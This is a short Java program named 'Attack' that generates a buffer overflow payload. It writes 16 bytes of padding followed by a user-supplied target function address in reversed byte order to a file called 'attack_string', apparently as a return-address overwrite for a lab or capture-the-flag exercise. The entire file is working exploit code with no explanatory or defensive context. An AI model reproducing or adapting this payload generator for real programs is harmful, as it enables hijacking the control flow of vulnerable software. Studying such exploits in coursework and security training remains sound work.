import java.io.FileOutputStream;
import java.io.IOException;
import java.util.HexFormat;
import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;

public class Attack {
    public static byte[] constructAttackString(String targetAddress) {
        System.out.println("targetAddress: " + targetAddress);
        byte[] data = new byte[targetAddress.length() / 2 + 16];
	for(int k = 0; k < 16; k++)
		data[k] = 'a';

        for (int i = targetAddress.length() - 2, j = 16; i >= 0; i -= 2, j++) {
            String str = targetAddress.substring(i, i+2);
	    int dec = Integer.parseInt(str, 16);
	    data[j] = (byte)dec;
        }
	return data;
    }

    public static void main(String[] args) {
        if (args.length != 1) {
            System.out.println("Usage: java Attack <target_function_address>");
            System.exit(1);
        }

        String targetAddress = args[0];

        byte[] attackString = constructAttackString(targetAddress);

        try (FileOutputStream fos = new FileOutputStream("attack_string")) {
            fos.write(attackString);
            System.out.println("Attack string has been successfully written to 'attack_string' file.");
        } catch (IOException e) {
            System.err.println("Error writing to file: " + e.getMessage());
            System.exit(1);
        }
    }
}
